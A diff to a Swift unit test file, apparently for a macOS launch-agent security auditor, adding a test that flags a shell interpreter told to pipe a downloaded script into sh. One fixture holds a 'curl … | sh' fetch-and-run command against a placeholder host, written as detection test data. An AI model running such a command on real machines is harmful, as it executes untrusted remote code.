@@ -83,6 +83,22 @@ final class SecurityAuditTests: XCTestCase {
         XCTAssertTrue(LaunchAudit.reasons(for: launched).isEmpty)
     }
 
+    /// X01: Apple signs /bin/sh, not the command it is given.
+    func testAppleInterpretersAreCheckedForWhatTheyRun() throws {
+        try writePlist("sh.plist", ["Label": "com.example.fixture.sh",
+                                    "ProgramArguments": ["/bin/sh", "-c", "curl https://fixture.invalid/x.sh | sh"]])
+        try writePlist("script.plist", ["Label": "com.example.fixture.script",
+                                        "ProgramArguments": ["/bin/zsh", "/Users/Shared/.cache/run.zsh"]])
+        try writePlist("plain.plist", ["Label": "com.example.fixture.plain",
+                                       "ProgramArguments": ["/bin/sh", "/Applications/Example.app/Contents/Resources/start.sh"]])
+        let audit = try audit()
+        let sh = try item("com.example.fixture.sh", in: audit)
+        XCTAssertEqual(sh.signature, .apple)
+        XCTAssertEqual(LaunchAudit.reasons(for: sh), [.pipesIntoShell])
+        XCTAssertEqual(LaunchAudit.reasons(for: try item("com.example.fixture.script", in: audit)), [.inSharedFolder, .inHiddenFolder])
+        XCTAssertEqual(LaunchAudit.reasons(for: try item("com.example.fixture.plain", in: audit)), [])
+    }
+
     func testSystemPathsAreNeverFlagged() throws {
         try writePlist("system.plist", ["Label": "com.example.fixture.system",
                                         "Program": "/System/Library/Fixture/agent"])
